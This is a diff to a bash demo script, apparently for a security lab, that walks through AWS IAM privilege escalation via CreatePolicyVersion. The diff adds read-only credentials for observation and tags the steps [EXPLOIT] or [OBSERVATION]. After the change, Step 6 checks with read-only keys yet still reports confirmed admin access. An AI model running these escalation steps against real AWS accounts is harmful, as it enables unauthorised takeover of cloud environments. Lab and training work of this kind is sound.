@@ -56,23 +56,47 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials and policy ARN
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
 POLICY_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.policy_arn')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Policy ARN: $POLICY_ARN"
 echo ""
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity as user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify identity as user
+use_starting_creds
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
@@ -84,7 +108,7 @@ if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 
-# Step 3: Assume the starting role
+# [EXPLOIT] Step 3: Assume the starting role
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $ROLE_ARN"
 
@@ -100,7 +124,7 @@ export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.Sess
 
 echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 
-# Step 4: Test current permissions (should be limited)
+# [EXPLOIT] Step 4: Test current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
@@ -110,7 +134,7 @@ else
     echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
 fi
 
-# Step 5: Perform privilege escalation via CreatePolicyVersion
+# [EXPLOIT] Step 5: Perform privilege escalation via CreatePolicyVersion
 echo -e "${YELLOW}Step 5: Escalating privileges via iam:CreatePolicyVersion${NC}"
 echo "Creating new policy version with admin permissions..."
 
@@ -145,15 +169,16 @@ echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# Step 6: Verify admin access
+# [OBSERVATION] Step 6: Verify admin access
+use_readonly_creds
 echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
-show_cmd "Attacker" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
+show_cmd "ReadOnly" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
 echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo "Testing S3 access..."
-show_cmd "Attacker" "aws s3 ls"
+show_cmd "ReadOnly" "aws s3 ls"
 aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
